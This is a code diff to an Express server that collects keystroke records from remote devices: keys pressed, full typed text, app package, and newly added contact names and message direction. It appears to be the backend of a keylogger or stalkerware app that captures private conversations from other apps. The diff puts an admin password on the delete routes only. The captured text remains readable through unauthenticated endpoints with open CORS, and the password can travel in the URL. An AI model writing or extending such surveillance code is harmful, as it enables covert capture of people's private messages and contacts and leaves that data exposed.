@@ -10,10 +10,35 @@ const KeystrokeRecord = require("./models/KeystrokeRecord");
 const app = express();
 const PORT = process.env.PORT || 3000;
 const DB_NAME = process.env.DB_NAME || "keyword_record";
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "";
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: "2mb" }));
 app.use(express.static(path.join(__dirname, "public")));
+
+function requireAdminPassword(req, res, next) {
+  if (!ADMIN_PASSWORD) {
+    return res.status(500).json({
+      success: false,
+      message: "ADMIN_PASSWORD is not set on the server",
+    });
+  }
+
+  const provided =
+    req.headers["x-admin-password"] ||
+    req.body?.password ||
+    req.query?.password ||
+    "";
+
+  if (String(provided) !== String(ADMIN_PASSWORD)) {
+    return res.status(401).json({
+      success: false,
+      message: "Invalid password",
+    });
+  }
+
+  return next();
+}
 
 app.get("/health", (_req, res) => {
   res.json({ status: "ok", message: "Keyword Record API is running" });
@@ -25,7 +50,15 @@ app.get("/ping", (_req, res) => {
 
 app.post("/api/keystrokes", async (req, res) => {
   try {
-    const { deviceUniqueId, keyPressed, fullText, appPackage, action } = req.body;
+    const {
+      deviceUniqueId,
+      keyPressed,
+      fullText,
+      appPackage,
+      action,
+      contactName,
+      direction,
+    } = req.body;
 
     if (!deviceUniqueId || keyPressed === undefined || keyPressed === null) {
       return res.status(400).json({
@@ -35,6 +68,11 @@ app.post("/api/keystrokes", async (req, res) => {
     }
 
     const recordId = uuidv4();
+    const normalizedDirection = ["outgoing", "incoming", "unknown"].includes(direction)
+      ? direction
+      : action === "incoming"
+        ? "incoming"
+        : "outgoing";
 
     const record = await KeystrokeRecord.create({
       recordId,
@@ -42,6 +80,8 @@ app.post("/api/keystrokes", async (req, res) => {
       keyPressed: String(keyPressed),
       fullText: fullText || "",
       appPackage: appPackage || "unknown",
+      contactName: contactName || "",
+      direction: normalizedDirection,
       action: action || "key",
     });
 
@@ -118,6 +158,7 @@ app.get("/api/records", async (req, res) => {
         { fullText: regex },
         { recordId: regex },
         { appPackage: regex },
+        { contactName: regex },
       ];
     }
 
@@ -126,7 +167,9 @@ app.get("/api/records", async (req, res) => {
         .sort({ createdAt: -1 })
         .skip(skip)
         .limit(limit)
-        .select("recordId deviceUniqueId keyPressed fullText appPackage action createdAt"),
+        .select(
+          "recordId deviceUniqueId keyPressed fullText appPackage contactName direction action createdAt"
+        ),
       KeystrokeRecord.countDocuments(filter),
     ]);
 
@@ -158,7 +201,9 @@ app.get("/api/keystrokes/:deviceUniqueId", async (req, res) => {
     const records = await KeystrokeRecord.find({ deviceUniqueId })
       .sort({ createdAt: -1 })
       .limit(limit)
-      .select("recordId keyPressed fullText appPackage action createdAt");
+      .select(
+        "recordId keyPressed fullText appPackage contactName direction action createdAt"
+      );
 
     res.json({
       success: true,
@@ -174,7 +219,7 @@ app.get("/api/keystrokes/:deviceUniqueId", async (req, res) => {
   }
 });
 
-app.delete("/api/records/:recordId", async (req, res) => {
+app.delete("/api/records/:recordId", requireAdminPassword, async (req, res) => {
   try {
     const { recordId } = req.params;
     const result = await KeystrokeRecord.deleteOne({ recordId });
@@ -200,7 +245,7 @@ app.delete("/api/records/:recordId", async (req, res) => {
   }
 });
 
-app.delete("/api/records", async (req, res) => {
+app.delete("/api/records", requireAdminPassword, async (req, res) => {
   try {
     const filter = {};
 
@@ -230,6 +275,12 @@ async function startServer() {
   if (!process.env.DB_URL) {
     console.error("DB_URL is missing. Add it to backend/.env");
     process.exit(1);
+  }
+
+  if (!ADMIN_PASSWORD) {
+    console.warn(
+      "WARNING: ADMIN_PASSWORD is not set. Delete buttons will not work until it is configured."
+    );
   }
 
   try {
